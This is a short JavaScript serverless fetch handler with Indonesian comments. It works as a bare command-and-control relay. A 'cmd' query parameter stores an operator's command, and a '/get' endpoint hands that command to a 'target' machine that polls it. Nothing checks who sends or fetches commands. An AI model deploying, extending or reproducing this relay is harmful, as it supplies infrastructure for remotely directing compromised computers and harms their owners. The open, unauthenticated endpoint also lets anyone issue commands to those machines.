let COMMAND = "NONE";

export default {
  async fetch(request) {
    const url = new URL(request.url);

    // simpan command
    if (url.searchParams.get("cmd")) {
      COMMAND = url.searchParams.get("cmd");
      return new Response("OK");
    }

    // target ambil command
    if (url.pathname === "/get") {
      return new Response(COMMAND);
    }

    return new Response("RUNNING");
  }
};
